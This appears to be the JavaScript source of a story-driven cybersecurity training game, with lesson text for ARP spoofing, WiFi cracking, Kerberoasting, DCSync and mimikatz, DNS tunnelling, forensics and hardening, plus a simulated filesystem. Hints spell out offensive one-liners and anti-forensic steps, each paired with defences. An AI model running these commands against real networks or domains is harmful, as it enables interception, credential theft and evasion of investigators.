    labels:{ histClear:"Clear your shell history", logTamper:"Understand how logs get tampered", timestamp:"Understand timestamp manipulation" },
    hints:["Clear the command history, and study how logs and timestamps get altered.","history -c clears history; study how log lines and file timestamps are modified.","history -c — study log tampering — study timestamp (touch -t) manipulation"],
    learned:"Anti-forensics covers tracks: history -c clears the shell record, log entries get selectively deleted, timestamps get reset with touch -t. For an authorised tester this is scoped cleanup; for a defender it's a curriculum — knowing these techniques is how you spot the gaps they leave (a cleared history is itself suspicious; logs shipped off-host can't be edited locally; filesystem timelines reveal touch tampering). You learn the offence to build the defence.",
    msg:"You understand how an intruder erases themselves now — which means you can spot where they failed to.\nV cleaned up well. But not perfectly. The gap they left is your way forward." },

  // ───────────────────────── CHAPTER 10 ─────────────────────────
  "10.1": {
    nar:"On a local network, whoever controls ARP controls the traffic. ARP spoofing tells two machines you're each other, putting you in the middle of their conversation. The foundation of every on-path attack starts here.",
    goal:"Poison the ARP cache between two hosts, enable forwarding so traffic still flows, and run an interception tool.",
    labels:{ arpSpoof:"Poison the ARP mapping between two hosts", ipForward:"Enable forwarding so traffic still flows", ettercap:"Run an interception tool" },
    hints:["Lie about MAC addresses, keep traffic flowing through you, then intercept it — three steps.","arpspoof poisons; enabling ip_forward keeps traffic moving; ettercap intercepts.","arpspoof -i eth0 -t victim gateway — echo 1 > /proc/sys/net/ipv4/ip_forward — ettercap -T -M arp"],
    learned:"ARP has no authentication, so ARP spoofing lets you claim to be the gateway: both victim and router send their traffic to you. Enabling IP forwarding makes you a transparent relay (so the victim notices nothing), and a tool like ettercap intercepts the flow. This is the basis of local man-in-the-middle. Defences are dynamic ARP inspection and, above all, encryption — which is why the next stage matters.",
    msg:"You sit between two machines now; their traffic flows through you.\nV used this on the internal segment. Position is power on a LAN." },
  "10.2": {
    nar:"Being in the middle is only useful if you can read what passes. SSL stripping and intercepting proxies try to peel back encryption or sit inside the TLS conversation — and where they fail is the proof that encryption is what actually protects users.",
    goal:"Intercept traffic in transit, and run an interception proxy to inspect it.",
    labels:{ tcpMitm:"Inspect traffic passing through you", mitmproxy:"Run an interception proxy" },
    hints:["Watch the intercepted traffic, then run a proper interception proxy to inspect and modify it.","tcpdump reads what flows through; mitmproxy gives an interactive interception proxy.","tcpdump -i eth0 -A — mitmproxy --mode transparent"],
    learned:"Once on-path, you inspect: tcpdump reads cleartext, and mitmproxy provides an interactive proxy to view and modify flows. SSL stripping tries to downgrade HTTPS to HTTP — but HSTS and modern browsers largely defeat it, and properly encrypted traffic stays opaque. That's the lesson cutting both ways: MITM is devastating against cleartext and nearly useless against correct TLS. Encryption is the control that holds.",
    msg:"Cleartext gave itself up instantly; the properly-encrypted flows stayed shut.\nV's notes underline it: 'TLS done right was the one thing I couldn't break.'" },
  "10.3": {
    nar:"WiFi is just radio you can capture. Put the card in monitor mode, watch the airspace, knock a client off to capture its reconnection handshake, then crack that handshake offline. The whole attack happens without ever joining the network.",
    goal:"Enter monitor mode, survey the airspace, force a handshake capture, and crack it offline.",
    labels:{ airmon:"Put the wireless card into monitor mode", airodump:"Survey the wireless airspace", deauth:"Force a client to reconnect", aircrack:"Crack the captured handshake" },
    hints:["Monitor mode, survey, knock a client off to capture the handshake, then crack it — four steps.","airmon-ng enables monitor mode; airodump-ng surveys/captures; aireplay-ng deauths; aircrack-ng cracks.","airmon-ng start wlan0 — airodump-ng wlan0mon — aireplay-ng --deauth — aircrack-ng capture.cap -w rockyou.txt"],
    learned:"WPA2 cracking is offline: airmon-ng sets monitor mode, airodump-ng captures the 4-way handshake, a deauth (aireplay-ng) forces a client to reconnect so you capture that handshake faster, and aircrack-ng cracks it against a wordlist. You never join the network — you capture radio and crack later. The defence is a long, non-dictionary passphrase (WPA2's weakness is the password, not the protocol) and WPA3.",
    msg:"You captured the handshake and cracked it against the wordlist.\nThis is squarely your home turf — the pocket Kali rig, the AR9271 sniffing the air. V would have approved." },
  "10.4": {
    nar:"DNS decides where names point. Poison it and you decide where victims go. Spoofing responses redirects traffic to machines you control — phishing, interception, or just quietly steering a target into a trap.",
    goal:"Run a spoofing DNS server, and poison a name to point where you choose.",
    labels:{ dnschef:"Run a spoofing DNS server", dnsPois:"Redirect a name to a host you control" },
    hints:["Stand up a lying DNS server, then make a name resolve to your address.","dnschef runs a spoofing resolver; configure it to poison a domain to your IP.","dnschef --fakeip 10.0.0.5 — poison target.machine to your host"],
    learned:"DNS spoofing/poisoning supplies forged answers so a victim resolves a name to your server instead of the real one — enabling phishing pages, traffic interception and redirection. Tools like dnschef make the host lie. The defences are DNSSEC (signed records), validating resolvers, and not trusting names blindly. Whoever controls name resolution controls where users actually go, regardless of what they typed.",
    msg:"You bent name resolution to your will — the victim's traffic goes where you say.\nV used DNS to redirect the escape signal. Control the names, control the path out." },
  "10.5": {
    nar:"Wireless isn't only WiFi. Bluetooth devices announce themselves constantly, and most were designed assuming nobody's listening. Scan classic and low-energy devices to see how much an unguarded radio gives away.",
    goal:"Scan for classic Bluetooth devices, run a dedicated scanner, and scan for Bluetooth Low Energy devices.",
    labels:{ hciscan:"Scan for classic Bluetooth devices", btscanner:"Run a dedicated Bluetooth scanner", hciBle:"Scan for Bluetooth Low Energy devices" },
    hints:["A classic scan, a dedicated scanner, and a low-energy scan — three Bluetooth sweeps.","hcitool scan finds classic devices; btscanner is a dedicated tool; hcitool lescan finds BLE.","hcitool scan — btscanner — hcitool lescan"],
    learned:"Bluetooth recon: hcitool scan finds discoverable classic devices, btscanner profiles them, and hcitool lescan sweeps for Bluetooth Low Energy (everywhere now — wearables, beacons, locks). Many devices leak identifiers, services and even location patterns to a passive listener. The lesson is that any radio is an attack surface; cheap BLE-capable boards make this trivial to experiment with.",
    msg:"The airspace is full of devices that assumed nobody was listening.\nEvery radio is a surface. V's notes end Chapter 10 with: 'the machine talks more than it knows.'" },

  // ───────────────────────── CHAPTER 11 ─────────────────────────
  "11.1": {
    nar:"You've harvested a pile of hashes. A hash is a one-way fingerprint — you don't reverse it, you guess inputs until one matches. Identify the type, then throw a wordlist at it with a GPU-grade cracker. This is real, and exactly the workflow run on dedicated cracking rigs.",
    goal:"Study how hashing works, identify a hash's type, then crack it two different ways.",
    labels:{ hashInfo:"Study how password hashing works", hashId:"Identify the type of a hash", hashcat:"Crack a hash with a GPU cracker", johnCrack:"Crack a hash with John the Ripper" },
    hints:["Understand hashing, identify the format, then crack with two different tools.","Read the hashing notes; hashid/hash-identifier names the type; hashcat and john crack it.","cat hashing.txt — hashid <hash> — hashcat -m 0 hash.txt rockyou.txt — john --wordlist=rockyou.txt hash.txt"],
    learned:"Hashes are one-way: cracking means hashing guesses until one matches the target. Identifying the algorithm first is essential — hashcat's -m mode must match (0=MD5, 1000=NTLM, 1800=sha512crypt). hashcat is GPU-accelerated and brutally fast; John the Ripper is the flexible CPU classic. Wordlists like rockyou.txt do most of the work because humans pick predictable passwords.",
    msg:"The hash fell — a human-chosen password, guessed in seconds.\nV cracked a hash here that unlocks something later. Keep the plaintext. You'll need it." },
  "11.2": {
    nar:"Plain wordlists run out. Advanced cracking shapes the guesses: rules mutate words the way people do (Password becomes P@ssw0rd!), masks brute-force specific patterns, and Windows NTLM hashes get their own treatment. Crack smarter, not just longer.",
    goal:"Apply mutation rules, run a targeted mask attack, and crack a Windows NTLM hash.",
    labels:{ hashRules:"Mutate the wordlist with rules", hashMask:"Brute-force a known pattern with a mask", ntlmCrk:"Crack a Windows NTLM hash" },
    hints:["Mutate words with rules, brute-force a pattern with a mask, and crack an NTLM hash.","hashcat -r applies rules; -a 3 with a mask brute-forces patterns; -m 1000 is NTLM.","hashcat -r best64.rule ... — hashcat -a 3 ?u?l?l?l?d?d ... — hashcat -m 1000 ntlm.txt rockyou.txt"],
    learned:"When wordlists fail, you shape guesses: rule files (best64, etc.) apply human-like mutations to each word; mask attacks (-a 3) brute-force a known structure (?u uppercase, ?l lower, ?d digit, ?s symbol) so you don't waste time on impossible combinations; and NTLM (-m 1000) is the Windows hash you'll meet constantly in AD. Smart cracking constrains the search space to how people actually build passwords.",
    msg:"A masked, rule-mutated attack cracked what the plain wordlist couldn't.\nV's cracking notes are dense here. The plaintext you just recovered matters for the domain chapter." },
  "11.3": {
    nar:"Crackers break weak secrets; understanding encryption is knowing what holds. Symmetric encryption, the TLS exchange, and signed/encrypted messaging — learn how data is actually protected so you know what's worth attacking and what isn't.",
    goal:"Encrypt and decrypt data symmetrically, inspect a TLS handshake, and use symmetric encryption with a passphrase.",
    labels:{ opensslEnc:"Encrypt and decrypt data symmetrically", opensslTls:"Inspect a live TLS handshake", gpgSym:"Encrypt a file with a passphrase" },
    hints:["Symmetric encrypt/decrypt, inspect a TLS handshake, and passphrase-encrypt a file — three crypto operations.","openssl enc does symmetric crypto; openssl s_client shows the TLS handshake; gpg -c encrypts with a passphrase.","openssl enc -aes-256-cbc ... — openssl s_client -connect host:443 — gpg -c secret.txt"],
    learned:"openssl enc does symmetric encryption (one shared key, fast, for bulk data); openssl s_client reveals a TLS handshake (cert chain, ciphers, the asymmetric key-exchange that bootstraps a symmetric session key); gpg -c encrypts a file under a passphrase. Knowing how crypto is built tells you where the soft spots are — almost never the algorithm, almost always key management, weak passphrases, or implementation mistakes.",
    msg:"You can protect data now, not just attack it. The strong crypto held; only the weak passphrase was ever the risk.\nV encrypted something on this box. You'll need a passphrase you cracked earlier to open it." },
  "11.4": {
    nar:"Some secrets hide in plain sight. Steganography buries data inside ordinary files; strings and carving tools pull hidden payloads back out. The most important habit: always look inside a file, never trust what its extension claims.",
    goal:"Carve hidden data out of a file, extract a steganographic payload, and pull readable strings from a binary.",
    labels:{ binwalk:"Carve hidden data out of a file", steghide:"Extract a steganographic payload", strings1:"Pull readable strings from a binary" },
    hints:["Carve embedded files out, extract a hidden payload, and scrape readable text from a binary.","binwalk finds/extracts embedded files; steghide extracts hidden data; strings dumps text.","binwalk -e image.png — steghide extract -sf image.jpg — strings binary"],
    learned:"Steganography hides data inside carrier files (an archive appended to a PNG, a message in a JPEG's bytes). binwalk detects and carves embedded files; steghide extracts payloads (often passphrase-protected); strings dumps the human-readable text from any binary — frequently revealing hardcoded creds, URLs, and flags. The habit that matters: a file's extension is a claim, not a fact. Always look inside.",
    msg:"A file pretending to be an image had another file buried inside it.\nV hid a key fragment in exactly this way. What looks like a photo on this box may not be one." },

  // ───────────────────────── CHAPTER 12 ─────────────────────────
  "12.1": {
    nar:"Now you turn defender. Every action leaves a trace in the logs — failed logins, sudo use, service events. Reading logs is how you reconstruct what an intruder did. Build the one-line pipeline that turns a noisy log into a ranked list of attackers.",
    goal:"Read the auth log, read the system log, extract the failed logins, and review the journal.",
    labels:{ authLog:"Read the authentication log", syslogC:"Read the system log", grepFail:"Extract the failed login attempts", journal:"Review the systemd journal" },
    hints:["Read the auth log and syslog, filter to the failures, and check the journal — four reads.","auth.log holds logins; syslog holds system events; grep 'Failed' isolates failures; journalctl reads the journal.","cat /var/log/auth.log — cat /var/log/syslog — grep Failed /var/log/auth.log — journalctl -xe"],
    learned:"Logs are the defender's evidence: /var/log/auth.log records authentication (failed and successful logins, sudo), /var/log/syslog general events, and journalctl reads systemd's structured journal. The killer pipeline — grep Failed auth.log | cut/awk the IP | sort | uniq -c | sort -rn — ranks attacking IPs by attempts in one line. The same pipe skills you learned for offence are how you read an attack after the fact.",
    msg:"The auth log shows a flood of failed logins from one IP — then one success. That's the breach, written down.\nV's intrusion is in these logs too, if you read carefully enough. The machine remembers everyone." },
  "12.2": {
    nar:"When the evidence is a disk, not a live system, you image it bit-for-bit and carve the artefacts out — deleted files, embedded data, hidden strings. Forensics is patient archaeology on storage.",
    goal:"Image a disk, carve files out of the image, and pull strings from raw storage.",
    labels:{ ddImage:"Make a bit-for-bit disk image", foremost:"Carve files out of the image", strDisk:"Pull strings from raw storage" },
    hints:["Image the disk bit-for-bit, carve files from the image, then scrape strings from it.","dd images block devices; foremost carves files by signature; strings scrapes text.","dd if=/dev/sdb of=disk.img — foremost -i disk.img — strings disk.img | less"],
    learned:"Disk forensics works on copies: dd makes a bit-for-bit image (you never work on the original — chain of custody), foremost/scalpel carve files back out by header signature even after deletion (deleting only unlinks; the bytes remain until overwritten), and strings surfaces readable text from raw storage. This is how deleted evidence, hidden partitions and residual secrets get recovered. Patience and exactness are the whole discipline.",
    msg:"You carved a deleted file back out of the disk image. Deletion isn't erasure — the bytes lingered.\nV deleted something here. It may still be carvable. Nothing is ever truly gone until it's overwritten." },
  "12.3": {
    nar:"When the alarm goes off for real, you follow a process: identify what's happening, contain it before it spreads, then hunt for indicators of compromise across the system. Calm method beats panic every time.",
    goal:"Review the IR process, understand containment, and hunt for indicators of compromise.",
    labels:{ irProcess:"Review the incident-response process", contain:"Understand containment", iocHunt:"Hunt for indicators of compromise" },
    hints:["Read the IR process, understand how to contain a live incident, then hunt for IOCs.","There's an ir_process reference; containment isolates the host; hunt for known-bad indicators.","cat ir_process.txt — study containment — hunt for IOCs (bad IPs, hashes, files)"],
    learned:"Incident response runs a sequence — prepare, identify, contain, eradicate, recover, learn. Containment (isolating a host, cutting network) stops spread before cleanup. IOC hunting searches for known-bad indicators (malicious IPs, file hashes, suspicious processes, rogue cron jobs, unexpected keys in authorized_keys) across the estate. The discipline is doing it methodically and documenting everything — assume you may have to testify about every action later.",
    msg:"You worked the incident like a professional: identify, contain, hunt — not panic.\nThe IOCs you hunted match V's persistence artefacts. You're now investigating the very intruder whose trail you've been following." },
  "12.4": {
    nar:"The richest evidence vanishes at shutdown — it's in RAM. Memory forensics recovers running processes, command histories and secrets straight from a memory image, including things that never touched the disk at all.",
    goal:"List processes from a memory image, recover shell history from memory, and pull strings from raw memory.",
    labels:{ volPslist:"List processes from a memory image", volBash:"Recover shell history from memory", strMem:"Pull strings from raw memory" },
    hints:["List processes from the memory image, recover the shell history from it, then scrape strings.","Volatility's pslist lists processes; its bash plugin recovers history; strings scrapes raw memory.","volatility -f mem.img pslist — volatility -f mem.img linux_bash — strings mem.img | grep -i pass"],
    learned:"Memory forensics (Volatility) analyses a RAM capture: pslist reconstructs the process tree, the bash plugin recovers commands typed in memory, and strings over raw memory surfaces passwords, keys and injected code that never hit disk. In-memory malware and fileless attacks are invisible to disk forensics but laid bare here. RAM is volatile — capture it before you pull the plug, because shutdown destroys the best evidence you'll ever get.",
    msg:"Memory gave up a command history and a plaintext secret that the disk never recorded.\nV operated in memory to stay quiet — but a memory capture sees everything. Their last live session is here, frozen." },

  // ───────────────────────── CHAPTER 13 ─────────────────────────
  "13.1": {
    nar:"You've spent twelve chapters attacking. Now defend. Hardening shrinks the attack surface you've learned to exploit — a firewall up, needless services off, brute-force protection on. Everything you know how to break tells you what to lock.",
    goal:"Enable the host firewall, disable an unneeded service, and configure brute-force protection.",
    labels:{ ufwOn:"Enable the host firewall", disableSvc:"Disable an unneeded service", fail2ban:"Configure brute-force protection" },
    hints:["Turn the firewall on, switch off a needless service, and add brute-force protection.","ufw enable turns on the firewall; systemctl disable stops a service; fail2ban blocks brute-forcers.","ufw enable — systemctl disable <service> — configure fail2ban"],
    learned:"Hardening reverses your offence: ufw (the host firewall) closes ports you'd otherwise scan; disabling unused services removes whole attack surfaces (you can't exploit what isn't running); fail2ban watches logs and auto-bans IPs that brute-force — defeating exactly the hydra attacks you ran. The principle is least surface, least privilege, least trust. Knowing the attack is what makes the defence precise.",
    msg:"You closed the doors you spent chapters learning to open. The brute-force tool that worked earlier now hits a ban after three tries.\nThis is how V's targets should have been configured. Few are." },
  "13.2": {
    nar:"The firewall's rules are the front line. iptables is the classic engine — list what's allowed, block what isn't, and make it persist. The same rules that stop an attacker are what an attacker reads to understand the perimeter.",
    goal:"List the current firewall rules, add a block rule, and save the ruleset.",
    labels:{ iptList:"List the current firewall rules", iptBlock:"Add a rule blocking traffic", iptSave:"Persist the firewall ruleset" },
    hints:["List the rules, add a block, then save so it survives a reboot.","iptables -L lists; iptables -A adds a rule; iptables-save persists it.","iptables -L -n -v — iptables -A INPUT -s <ip> -j DROP — iptables-save"],
    learned:"iptables filters packets through chains (INPUT/OUTPUT/FORWARD) of rules: -L lists, -A appends a rule (-s source, -j DROP/ACCEPT the action), and iptables-save persists it across reboots. Reading a firewall's ruleset tells an attacker exactly what's permitted; writing it tells a defender exactly what's denied. The escape chapter hinges on understanding which outbound traffic a firewall does and doesn't allow.",
    msg:"You can read and write the perimeter now. Notice what most rulesets forget to restrict: outbound traffic.\nThat blind spot — egress — is precisely the gap V's escape exploited. Remember it." },
  "13.3": {
    nar:"Firewalls block; monitoring watches. Auditing records every sensitive action, and queryable endpoint tooling lets you ask the whole system questions like a database. You can't defend what you can't see.",
    goal:"Set an audit rule, search the audit log, and query system state.",
    labels:{ auditctl:"Set a system audit rule", ausearch:"Search the audit log", osquery:"Query system state like a database" },
    hints:["Add an audit rule, search what it recorded, then query system state directly.","auditctl sets rules; ausearch queries the audit log; osquery treats the OS as SQL tables.","auditctl -w /etc/passwd -p wa — ausearch -f /etc/passwd — osquery 'SELECT * FROM processes'"],
    learned:"The audit framework (auditctl to set watch rules, ausearch to query) records sensitive events — who touched /etc/passwd, who used a syscall — at the kernel level, hard for an intruder to evade. osquery exposes the live OS as SQL tables (processes, listening_ports, users), so you hunt with queries instead of a dozen commands. Detection is half of security: prevention fails eventually, and monitoring is how you know when it did.",
    msg:"You can watch the system now, not just wall it off. Every touch of a sensitive file is recorded.\nIf V's targets had run auditd, the trail you've followed would have lit up like a flare." },
  "13.4": {
    nar:"The final defensive skill is proactive: assume you're already breached and go looking. Threat hunting queries the system for the very artefacts you learned to plant — odd connections, rogue accounts, suspicious cron jobs. You hunt yourself.",
    goal:"Hunt for suspicious connections, rogue accounts, and malicious scheduled jobs.",
    labels:{ huntConns:"Hunt for suspicious network connections", huntAccts:"Hunt for rogue accounts", huntCrons:"Hunt for malicious scheduled jobs" },
    hints:["Hunt unusual connections, unexpected accounts, and suspicious cron jobs — three hunts.","ss/netstat for connections; check /etc/passwd for odd accounts; inspect crontabs.","ss -tupn (odd outbound?) — grep bash /etc/passwd (rogue users?) — cat /etc/crontab and crontabs"],
    learned:"Threat hunting assumes compromise and searches for it: unexpected outbound connections (a beacon to a C2), accounts you didn't create (especially UID 0 ones), cron jobs that re-establish access, keys in authorized_keys you didn't add. These are exactly the persistence artefacts from Chapter 9 — you plant them as an attacker and hunt them as a defender. The two halves of the curriculum close the loop: offence taught you precisely what to look for.",
    msg:"You hunted the system for intruder artefacts — and found the persistence V left behind.\nNow you know how they planned to get back in. That mechanism is the door you'll walk out through." },

  // ───────────────────────── CHAPTER 14 ─────────────────────────
  "14.1": {
    nar:"Corporate networks run on Active Directory — one identity system to rule every machine. Its strength is central control; its weakness is that one compromised account can cascade across the whole domain. Learn its shape first.",
    goal:"Study AD fundamentals, query the directory, and enumerate the domain with a credential.",
    labels:{ adBasics:"Study Active Directory fundamentals", ldapsrch:"Query the directory over LDAP", cme:"Enumerate the domain with a credential" },
    hints:["Read the AD basics, query the directory over LDAP, then enumerate with a found credential.","There's an ad_basics reference; ldapsearch queries the directory; crackmapexec enumerates.","cat ad_basics.txt — ldapsearch -x -b 'dc=target,dc=machine' — crackmapexec smb 10.0.0.0/24"],
    learned:"Active Directory centralises identity: domain controllers, users, groups, and Kerberos tickets. LDAP queries the directory's contents (users, groups, computers, descriptions — which sometimes contain passwords); crackmapexec sprays a credential across the network to map where it's valid. AD's central trust is the prize — compromise the right account and you own every joined machine. Enumeration of the directory is the foundation of every AD attack.",
    msg:"The directory mapped the whole domain — users, groups, machines, trusts.\nThe reused credential you carried from .10 is valid here. One password, a whole domain. V knew." },
  "14.2": {
    nar:"Kerberos is AD's ticket system, and it has a famous flaw: any user can request a service ticket encrypted with a service account's password hash — then crack it offline. Kerberoasting turns a normal account into a path to privileged ones.",
    goal:"Study Kerberos, request service tickets for offline cracking, and crack one.",
    labels:{ kerbNotes:"Study how Kerberos works", kerbRoast:"Request crackable service tickets", kerbCrack:"Crack a service ticket offline" },
    hints:["Understand Kerberos, request roastable tickets, then crack one offline.","There's a kerberos reference; GetUserSPNs/Rubeus requests tickets; hashcat -m 13100 cracks them.","cat kerberos.txt — request SPN tickets (Kerberoast) — hashcat -m 13100 tickets.txt rockyou.txt"],
    learned:"Kerberos issues tickets; the flaw is that any authenticated user can request a service ticket (TGS) for any account with a Service Principal Name, and that ticket is encrypted with the service account's password hash. Request it, take it offline, crack it (hashcat -m 13100) — no admin needed to start. Service accounts often have weak, never-rotated passwords and high privilege, making Kerberoasting one of the most reliable real-world AD escalations. The defence: long managed-service-account passwords.",
    msg:"A service ticket cracked to a service account's password — and that account is over-privileged, as they always are.\nV's notes called Kerberoasting 'the skeleton key of every corporate network'. They weren't exaggerating." },
  "14.3": {
    nar:"With the right account, you stop attacking the domain and start owning it. DCSync impersonates a domain controller to pull every credential; a golden ticket forges Kerberos itself. This is total domain dominance — the deepest compromise there is.",
    goal:"Pull domain credentials via replication, and understand the golden ticket.",
    labels:{ dcsync:"Pull domain credentials via replication", golden:"Understand the golden ticket attack" },
    hints:["Impersonate a DC to pull all credentials, then understand the forge-everything attack.","DCSync abuses replication rights to dump hashes; a golden ticket forges Kerberos TGTs.","mimikatz lsadump::dcsync /user:krbtgt — study the golden ticket (forged TGT)"],
    learned:"At the top of AD: DCSync abuses replication privileges to ask a domain controller for any account's hash — including krbtgt, the account that signs all Kerberos tickets. With the krbtgt hash you forge a golden ticket: a self-made TGT granting any identity, any group, valid for years and nearly undetectable. This is game-over for a domain. The only real recovery is rotating krbtgt twice and rebuilding trust — which is why protecting domain-controller and replication rights is everything.",
    msg:"You pulled the krbtgt hash. With it, you can forge any identity in the domain at will. Total dominance.\nV reached this point too — and that's when something went wrong for them. Power this complete attracts attention." },
  "14.4": {
    nar:"AD attacks land you on Windows hosts, where escalation has its own playbook and one tool reigns: mimikatz, which pulls plaintext credentials and hashes straight from memory. Enumerate the Windows privesc surface, then harvest.",
    goal:"Enumerate Windows privilege-escalation paths, and harvest credentials from memory.",
    labels:{ winpeas:"Enumerate Windows privesc paths", mimikatz:"Harvest credentials from memory" },
    hints:["Enumerate the Windows escalation surface, then pull credentials from memory.","winpeas automates Windows privesc enum; mimikatz dumps creds from LSASS memory.","winpeas.exe — mimikatz sekurlsa::logonpasswords"],
    learned:"Windows privesc has its own surface — unquoted service paths, weak service permissions, AlwaysInstallElevated, token privileges — and winPEAS enumerates it the way linpeas does on Linux. mimikatz is the legendary credential tool: sekurlsa::logonpasswords pulls plaintext passwords, hashes and Kerberos tickets straight from LSASS memory. It's why credential caching, Credential Guard and LSASS protection exist. On Windows, memory is where the keys live.",
    msg:"mimikatz pulled plaintext credentials from memory — the last keys you needed.\nYou now hold everything V held: every credential, every key fragment. It's time to assemble them and leave." },

  // ───────────────────────── CHAPTER 15 ─────────────────────────
  "15.1": {
    nar:"The escape comes down to one thing: the firewall standing between you and the outside. You've learned to read rulesets — now read this one completely. The way out is written in what it forgets to forbid.",
    goal:"Read the firewall's rules, examine its output policy, and study the full ruleset file.",
    labels:{ fwRules:"Read the firewall's active rules", fwOutput:"Examine the outbound (egress) policy", fwRulesTxt:"Study the full ruleset file" },
    hints:["Read the active rules, focus on the outbound policy, then study the full ruleset file.","iptables -L shows rules; pay attention to the OUTPUT chain; read the rules file in /sys/firewall.","iptables -L -n — examine the OUTPUT/egress policy — cat /sys/firewall/rules.txt"],
    learned:"The firewall blocks inbound thoroughly — but like almost every real ruleset, its egress (outbound) policy is permissive. Specifically, it lets DNS (port 53) out unquestioned, because blocking DNS breaks everything. That single allowed protocol is the seam. The lesson that's defined real exfiltration for decades: defenders obsess over what gets in and under-control what gets out. Egress is the blind spot.",
    msg:"The firewall is a fortress facing inward — and wide open facing out. Port 53, DNS, flows freely.\nThat's the gap. V saw it too. The escape was never through the walls — it was through the one door left unlocked." },
  "15.2": {
    nar:"DNS gets out where nothing else can — so you tunnel through it. Encoding data into DNS queries smuggles a whole connection past a firewall that only thought it was answering name lookups. This is how V planned to leave, and now you will.",
    goal:"Study the DNS-tunnel notes, set up the tunnel, and test that traffic escapes through it.",
    labels:{ dnsNotes:"Study the DNS-tunnelling technique", iodine:"Set up the DNS tunnel", fwTest:"Confirm traffic escapes through it" },
    hints:["Understand DNS tunnelling, stand up the tunnel, then confirm traffic escapes.","There's a dns_tunnel reference; iodine builds a DNS tunnel; then verify egress works.","cat dns_tunnel.txt — iodine -f <ns> <domain> — test that traffic escapes via port 53"],
    learned:"DNS tunnelling encodes arbitrary data into DNS queries and responses (data hidden in subdomain labels, replies in TXT/CNAME records). Tools like iodine or dnscat2 build a full bidirectional channel over port 53 — which firewalls almost never block because DNS is essential. It's slow but nearly unstoppable without DNS inspection. This is the textbook covert exfiltration channel, exploiting the exact egress blind spot you found in 15.1.",
    msg:"The tunnel holds. Data is leaving this machine disguised as innocent DNS lookups, straight through the firewall.\nThis is the channel V built. You're standing where they stood, about to do what they did." },
  "15.3": {
    nar:"Everything converges here. Every credential, every key fragment, every technique — assembled into one chain. Read the escape script V left, understand the full attack it encodes, and execute it. Walk out the door you found.",
    goal:"Read V's escape script and understand the full chain, then execute the escape.",
    labels:{ readEscape:"Read and understand V's escape script", runEscape:"Execute the full escape chain" },
    hints:["Read the escape script and understand the whole chain it encodes, then run it.","The escape script is in /sys/firewall; read it fully, then execute it to leave.","cat /sys/firewall/escape.sh — then run it (./escape.sh --tunnel dns --target external --encrypt aes256) to escape.","Optional true ending: if you found and assembled V's three key fragments (decode frag1, pull frag2 out of the fake image, read frag3 as root, join them in order), run: ./escape.sh --tunnel dns --key <assembled key>"],
    learned:"The full chain is everything you learned, in order: recon found the target, exploitation got a foothold, escalation made you root, harvesting gave you credentials, lateral movement crossed the network, the defensive chapters taught you to read the firewall, and the egress blind spot plus DNS tunnelling carry you out. A real attack is never one trick — it's a chain where each link depends on the last. You didn't memorise commands; you learned to think in chains. That's what makes an operator.",
    msg:"__ESCAPE__" },
};

function L(stage){
  if (!stage) return stage;
  const o = LESSONS[stage.id] || {};
  return {
    ...stage,
    nar: o.nar || stage.nar,
    goal: o.goal || stage.goal || null,
    hints: o.hints || stage.hints || [],
    msg: o.msg || stage.msg,
    learned: o.learned || stage.learned || null,
    obj: stage.obj.map(ob => ({ ...ob, l: (o.labels && o.labels[ob.id]) || ob.l })),
  };
}

// ─────────────────────────────────────────────────────────
// REAL FILESYSTEM ENGINE  (commands operate on actual state)
// OS commands are real; security tools fall back to simulation.
// ─────────────────────────────────────────────────────────
const ROOT_PW = "R3dDr@g0n_2021";

function _f(content, owner = "stranger", mode = "644") { return { t:"f", owner, mode, content }; }
function _d(children = {}, owner = "stranger", mode = "755") { return { t:"d", owner, mode, children }; }

function makeWorld() {
  const fs = _d({}, "root", "755");
  const put = (path, node) => {
    const parts = path.split("/").filter(Boolean);
    const name = parts.pop();
    let cur = fs;
    for (const p of parts) {
      if (!cur.children[p]) cur.children[p] = _d({}, "root", "755");
      cur = cur.children[p];
    }
    cur.children[name] = node;
  };
  // base tree
  ["/home","/home/stranger","/home/stranger/Documents","/home/stranger/Desktop",
   "/etc","/etc/axiom","/var","/var/log","/var/www","/var/www/html","/var/backups",
   "/opt","/opt/recon","/opt/scan","/opt/exploit","/sys","/sys/firewall","/root","/tmp",
   "/usr","/usr/share","/proc","/proc/1","/proc/1847"].forEach(p => put(p, _d({}, p.startsWith("/home/stranger")?"stranger":"root", "755")));
  fs.children.root.mode = "700"; fs.children.root.owner = "root";
  fs.children.etc.children.axiom.mode = "700"; fs.children.etc.children.axiom.owner = "root";
  fs.children.tmp.mode = "777";

  // populate from VFILES (real paths) and REF (reference docs)
  for (const [path, content] of Object.entries(VFILES)) {
    const isShadow = path.endsWith("/shadow");
    put(path, _f(content, path.startsWith("/home/stranger")?"stranger":"root", isShadow ? "640" : "644"));
  }
  // reference cheat-sheets become real files under Documents (and basename-readable)
  for (const [name, content] of Object.entries(REF)) {
    put("/home/stranger/Documents/" + name, _f(content, "stranger"));
  }
  // visible flavor files referenced by ls
  put("/home/stranger/Documents/notes.txt", _f("Target box. Explore everything. Read what's hidden.\n", "stranger"));
  put("/home/stranger/notes.txt", _f("First notes. Look around: ls -la, then read the dotfiles.\nThe machine watches — /var/log knows things.\n", "stranger"));
  put("/home/stranger/Desktop/readme.txt", _f("Awake again. whoami / pwd / ls -la. Look properly.\n", "stranger"));
  // /proc — what's running
  put("/proc/1/cmdline", _f("/sbin/init\n", "root"));
  put("/proc/1847/cmdline", _f("/opt/axiom/axiom-daemon --monitor --watch-session\n", "root"));

  // ── the solvable root chain (clues hidden in files) ──
  put("/home/stranger/.secret", _f(
    "Good. You look for what's hidden.\n\nThe last user left tracks in ~/.bash_history.\nRead it.\n", "stranger", "600"));
  put("/home/stranger/.bash_history", _f(
    "whoami\nls -la\ncat /var/www/html/config.php\nmysql -h 10.0.0.10 -u root -pAxiom2021!\n# host root password got reused — it's in the db backup under /var/backups\nsudo -l\nclear\n", "stranger", "600"));
  put("/var/backups/db_dump.sql.bak", _f(
    "-- AXIOM corpdb dump\nINSERT INTO admins VALUES('root','" + ROOT_PW + "');\n-- creds reused on the host. careless.\n", "root", "644"));
  put("/etc/shadow", _f(
    "root:$6$axiom$REDACTED:19000:0:99999:7:::\nstranger:$6$x$REDACTED:19000:0:99999:7:::\n", "root", "640"));
  put("/etc/axiom/.vault", _f("AXIOM ROOT CREDENTIAL\nroot password: " + ROOT_PW + "\n", "root", "600"));
  put("/root/flag.txt", _f("root's home. The box is yours.\nYou can read /etc/shadow and reboot now.\n", "root", "600"));

  // ─────────────────────────────────────────────────────────────────────
  // V's TRAIL — a hand-held, story-driven breadcrumb path that teaches a
  // total beginner Linux from zero while leading to the one real escape.
  // V is the prisoner who got out before you and left the whole way back.
